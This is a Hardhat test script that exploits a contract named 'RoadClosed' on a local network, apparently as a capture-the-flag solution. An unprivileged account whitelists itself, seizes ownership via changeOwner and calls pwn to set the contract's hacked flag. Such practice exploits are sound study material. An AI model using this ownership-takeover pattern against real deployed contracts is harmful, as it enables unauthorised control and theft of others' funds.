const { ethers } = require("hardhat");
const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");

describe("", function () {
  async function deployLoadfixture() {
    const [owner, addr1, addr2] = await ethers.getSigners();
    const factoryObj = await ethers.getContractFactory("RoadClosed");
    const contractObj = await factoryObj.deploy();
    await contractObj.deployed();
    return [owner, addr1, addr2, contractObj];
  }

  describe(" ", function () {
    it("Becoming owner of the contract :", async () => {
      const [owner, addr1, addr2, contractObj] = await loadFixture(
        deployLoadfixture
      );
      console.log("Becoming owner of the contract");
      console.log("deployer is Owner EOA:", owner.address);
      console.log("New Owner EOA        :", addr1.address);
      console.log("BEFORE :");
      console.log("deployer address:", owner.address);
      console.log("deoloyer is the owner ? :", await contractObj.isOwner());
      ///whiteListing
      await contractObj.connect(addr1).addToWhitelist(addr1.address);
      await contractObj.connect(addr1).changeOwner(addr1.address);
      console.log("AFTER :");
      console.log("deployer is the owner ? :", await contractObj.isOwner());
      const provider = waffle.provider;
      console.log(
        "new owner address at slot 0:",
        await provider.getStorageAt(contractObj.address, 0)
      );
    });

    it("changing hacked value to true", async () => {
      const [owner, addr1, addr2, contractObj] = await loadFixture(
        deployLoadfixture
      );
      console.log("");
      console.log("changing hacked value to true");
      console.log("BEFORE :");
      console.log("Is the contract hacked ? :", await contractObj.isHacked());
      await contractObj.connect(addr1).addToWhitelist(addr1.address);
      await contractObj.connect(addr1).changeOwner(addr1.address);
      await contractObj.connect(addr1).pwn(addr1.address);
      console.log("AFTER :");
      console.log(
        "Is the contract hacked ? :",
        await contractObj.connect(addr1).isHacked()
      );
    });
  });
});
